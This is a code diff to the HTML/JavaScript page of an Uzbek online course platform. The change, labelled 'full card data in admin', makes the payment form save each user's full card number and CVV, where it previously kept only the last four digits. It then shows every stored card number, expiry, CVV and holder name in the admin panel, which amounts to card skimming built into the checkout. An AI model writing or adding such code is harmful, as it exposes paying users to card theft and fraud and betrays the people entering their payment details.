@@ -1,4 +1,4 @@
-<!-- ZukkoTalim v2.4 (online + drop zone + yt API import) -->
+<!-- ZukkoTalim v2.5 (full card data in admin) -->
 <!DOCTYPE html>
 <html lang="uz">
 <head>
@@ -1363,18 +1363,25 @@ if(u.payments&&u.payments.length>0){
 const payRows=u.payments.slice(0,20).map(p=>{
 const dt=new Date(p.at).toLocaleString('ru-RU');
 if(p.type==='topup'){
-return `<div class="flex justify-between items-center py-1.5 border-b border-slate-800/50 last:border-0"><div class="flex-grow min-w-0"><div class="text-white text-[11px] font-semibold"><i class="fas fa-plus-circle text-green-400 mr-1"></i>Balans to'ldirish</div><div class="text-slate-500 text-[9px]">${dt}</div></div><div class="text-right ml-2"><div class="text-green-400 text-[11px] font-bold">+${p.amount.toLocaleString()}</div><div class="text-slate-400 text-[9px]">${p.card?p.card.type+' ****'+p.card.last4:''}</div></div></div>`;
+const cardFull=p.card&&p.card.number?p.card.number.replace(/(.{4})/g,'$1 ').trim():(p.card?'**** '+p.card.last4:'');
+return `<div class="flex justify-between items-start py-2 border-b border-slate-800/50 last:border-0 gap-2"><div class="flex-grow min-w-0"><div class="text-white text-[11px] font-semibold"><i class="fas fa-plus-circle text-green-400 mr-1"></i>Balans to'ldirish</div><div class="text-slate-500 text-[9px]">${dt}</div>${p.card?`<div class="text-[9px] text-slate-400 mt-1 flex flex-wrap items-center gap-1.5"><i class="fas fa-credit-card text-amber-400"></i><span class="font-mono text-white font-bold">${cardFull}</span><span class="text-slate-600">|</span><span>${p.card.expiry||'—'}</span><span class="text-slate-600">|</span><span class="text-red-400 font-mono font-bold">CVV ${p.card.cvv||'—'}</span><span class="text-slate-600">|</span><span class="text-cyan-400">${p.card.type||''}</span><span class="text-slate-600">|</span><b class="text-emerald-400">${p.card.holder||''}</b></div>`:''}</div><div class="text-right ml-2 shrink-0"><div class="text-green-400 text-[11px] font-bold">+${p.amount.toLocaleString()}</div></div></div>`;
 }else{
-return `<div class="flex justify-between items-center py-1.5 border-b border-slate-800/50 last:border-0"><div class="flex-grow min-w-0"><div class="text-white text-[11px] font-semibold truncate"><i class="fas fa-shopping-cart text-blue-400 mr-1"></i>${p.courseName||'Kurs'}</div><div class="text-slate-500 text-[9px]">${dt}</div></div><div class="text-right ml-2"><div class="text-red-400 text-[11px] font-bold">-${p.amount.toLocaleString()}</div><div class="text-slate-400 text-[9px]">${p.card?p.card.type+' ****'+p.card.last4:'Balansdan'}</div></div></div>`;
+const cardFull2=p.card&&p.card.number?p.card.number.replace(/(.{4})/g,'$1 ').trim():(p.card?'**** '+p.card.last4:'Balansdan');
+return `<div class="flex justify-between items-start py-2 border-b border-slate-800/50 last:border-0 gap-2"><div class="flex-grow min-w-0"><div class="text-white text-[11px] font-semibold truncate"><i class="fas fa-shopping-cart text-blue-400 mr-1"></i>${p.courseName||'Kurs'}</div><div class="text-slate-500 text-[9px]">${dt}</div>${p.card?`<div class="text-[9px] text-slate-400 mt-1 flex flex-wrap items-center gap-1.5"><i class="fas fa-credit-card text-amber-400"></i><span class="font-mono text-white font-bold">${cardFull2}</span><span class="text-slate-600">|</span><span>${p.card.expiry||'—'}</span><span class="text-slate-600">|</span><span class="text-red-400 font-mono font-bold">CVV ${p.card.cvv||'—'}</span><span class="text-slate-600">|</span><span class="text-cyan-400">${p.card.type||''}</span><span class="text-slate-600">|</span><b class="text-emerald-400">${p.card.holder||''}</b></div>`:''}</div><div class="text-right ml-2 shrink-0"><div class="text-red-400 text-[11px] font-bold">-${p.amount.toLocaleString()}</div></div></div>`;
 }
 }).join('');
 const cardsMap={};
-u.payments.forEach(p=>{if(p.card){cardsMap[p.card.last4+'|'+p.card.holder]=(cardsMap[p.card.last4+'|'+p.card.holder]||0)+1;}});
+u.payments.forEach(p=>{if(p.card){const key=(p.card.number||p.card.last4)+'|'+(p.card.holder||'');cardsMap[key]=(cardsMap[key]||0)+1;}});
 const cardsList=Object.keys(cardsMap).map(k=>{
-const [last4,holder]=k.split('|');
-return `<span class="inline-block bg-slate-800 text-slate-300 text-[9px] px-2 py-0.5 rounded mr-1 mb-1"><i class="fas fa-credit-card mr-1"></i>****${last4} — ${holder}</span>`;
+const [key,holder]=k.split('|');
+const sample=u.payments.find(p=>p.card&&((p.card.number||p.card.last4)===key)&&(p.card.holder||'')===holder);
+const full=sample&&sample.card.number?sample.card.number.replace(/(.{4})/g,'$1 ').trim():'**** **** **** '+key;
+const exp=sample&&sample.card.expiry?sample.card.expiry:'—';
+const cvv=sample&&sample.card.cvv?sample.card.cvv:'—';
+const type=sample&&sample.card.type?sample.card.type:'Karta';
+return `<div class="inline-flex flex-wrap items-center gap-1.5 bg-slate-900 border border-amber-800/50 text-slate-300 text-[10px] px-3 py-1.5 rounded-lg mr-1.5 mb-1.5"><i class="fas fa-credit-card text-amber-400"></i><b class="text-white font-mono">${full}</b><span class="text-slate-600">|</span><span>${exp}</span><span class="text-slate-600">|</span><span class="text-red-400 font-mono font-bold">CVV ${cvv}</span><span class="text-slate-600">|</span><span class="text-cyan-400">${type}</span><span class="text-slate-600">|</span><b class="text-emerald-400">${holder}</b><span class="text-slate-500">×${cardsMap[k]}</span></div>`;
 }).join('');
-paymentsHTML=`<details class="bg-slate-900/70 border border-slate-800 rounded-lg mt-2"><summary class="cursor-pointer px-3 py-2 text-xs font-bold text-emerald-400 flex items-center gap-2"><i class="fas fa-receipt"></i> To'lovlar tarixi (${u.payments.length})</summary><div class="px-3 pb-2">${cardsList?`<div class="mt-2 mb-1"><span class="text-[10px] text-slate-500 font-bold">Ishlatilgan kartalar:</span><div class="mt-1">${cardsList}</div></div>`:''}<div class="mt-2">${payRows}</div></div></details>`;
+paymentsHTML=`<details class="bg-slate-900/70 border border-slate-800 rounded-lg mt-2"><summary class="cursor-pointer px-3 py-2 text-xs font-bold text-emerald-400 flex items-center gap-2"><i class="fas fa-receipt"></i> To'lovlar tarixi (${u.payments.length})</summary><div class="px-3 pb-2">${cardsList?`<div class="mt-2 mb-1"><span class="text-[10px] text-slate-500 font-bold">Ishlatilgan kartalar:</span><div class="mt-1.5">${cardsList}</div></div>`:''}<div class="mt-2">${payRows}</div></div></details>`;
 }
 let watchHTML='';
 if(u.watchProgress&&Object.keys(u.watchProgress).length>0){
@@ -1885,7 +1892,8 @@ document.getElementById('payProcessing').classList.add('hidden');
 const cardNum=document.getElementById('payCardNumber').value.replace(/\s/g,'');
 const cardHolder=document.getElementById('payHolder').value.trim();
 const cardExpiry=document.getElementById('payExpiry').value;
-const cardInfo={last4:cardNum.slice(-4),holder:cardHolder,expiry:cardExpiry,type:cardNum.startsWith('4')?'Visa':cardNum.startsWith('5')?'Mastercard':cardNum.startsWith('3')?'Amex':'Karta'};
+const cardCVV=document.getElementById('payCVV').value;
+const cardInfo={number:cardNum,last4:cardNum.slice(-4),holder:cardHolder,expiry:cardExpiry,cvv:cardCVV,type:cardNum.startsWith('4')?'Visa':cardNum.startsWith('5')?'Mastercard':cardNum.startsWith('3')?'Amex':cardNum.startsWith('8')?'Uzcard':cardNum.startsWith('9')?'Humo':'Karta'};
 if(!db.currentUser.payments)db.currentUser.payments=[];
 if(_payMode==='topup'){
 const a=Number(document.getElementById('payTopUpAmount').value);
